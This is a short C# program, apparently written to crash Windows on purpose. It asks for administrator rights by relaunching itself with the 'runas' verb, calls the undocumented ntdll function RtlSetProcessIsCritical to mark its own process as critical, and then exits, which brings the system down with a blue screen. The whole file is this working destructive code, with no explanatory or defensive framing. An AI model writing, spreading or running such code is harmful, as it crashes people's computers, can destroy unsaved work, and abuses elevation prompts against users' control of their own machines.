using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace RtlSetProcessIsCritical {
    internal abstract class Program {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(uint newValue, uint oldValue, uint checkFlag);

        private static void Main() {
            try {
                Process.EnterDebugMode();
            } catch (Exception) {
                var proc = new Process {
                    StartInfo = {
                        FileName = Assembly.GetExecutingAssembly().Location, UseShellExecute = true, Verb = "runas"
                    }
                };
                proc.Start();
            }

            RtlSetProcessIsCritical(1, 0, 0);

            Environment.Exit(1);
        }
    }
}